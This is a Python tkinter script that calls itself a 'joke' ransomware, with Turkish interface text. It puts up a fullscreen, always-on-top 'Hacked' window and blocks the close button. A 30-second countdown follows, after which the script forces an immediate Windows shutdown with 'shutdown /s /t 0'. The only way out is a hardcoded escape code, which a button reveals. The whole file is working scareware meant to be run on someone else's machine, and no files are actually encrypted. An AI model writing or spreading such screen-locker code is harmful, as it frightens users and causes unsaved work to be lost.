import sys
import tkinter as tk
import os
from tkinter import messagebox
message = "Hacked By Poyraz with FYazilim \n\n This Ransomware Is A Joke \n\n But Be Careful For Real Ransomwares. \n\n ŞNow You Can Get Key \n\n With The Links. "
def  dcat():
    messagebox.showinfo("Al","Programın Bu Sürümünde Şifreyi Açık Olarak Veriyorum. Bi Dahakine Affetmem :)  \nŞifre: {}".format(escapecode))
escapecode = "matkapisthebest"
def submit():
    if entry.get() == escapecode:
        messagebox.showinfo("Kaçtın!", "Kaçmayı Başardın! Umarım Yazılımıda Temizlemeyi Başarırsın!")
        sys.exit()
i = 30
def gerisayım():
    global i
    i = i - 1
    label.configure(text="Kapanmaya Kalan Süre:   {}".format(str(i)))
    pencere.after(1000,gerisayım)
    if i == 0:
        os.system('shutdown /s /t 0')
pencere = tk.Tk()
pencere.title("Hacked")
pencere.attributes('-fullscreen',True)
pencere.config(bg="#282828")
pencere.wm_attributes("-topmost", 1)
hacked_l = tk.Label(text=message,bg="#282828",font="Times  23 bold")
hacked_l.pack(pady=20)
label2= tk.Label(text="Kaçış Kodunu Girin:",bg="#282828",font="Times 16 bold")
label2.pack(pady=20)

entry = tk.Entry()
entry.pack(pady=20)

button = tk.Button(text="Kaç",bg="#282828",fg="gray",border=0,command=submit)
button.pack(pady=20)
label = tk.Label(text="30",bg="#282828",font="Times 18 bold")
label.pack(pady=20)
bag_1  = tk.Button(text="Şifreyi Göster",font="Verdana 10 underline",bg="#282828",border=0,command=dcat)
bag_1.pack()
gerisayım()
pencere.protocol("WM_DELETE_WINDOW", lambda: None)




pencere.mainloop()











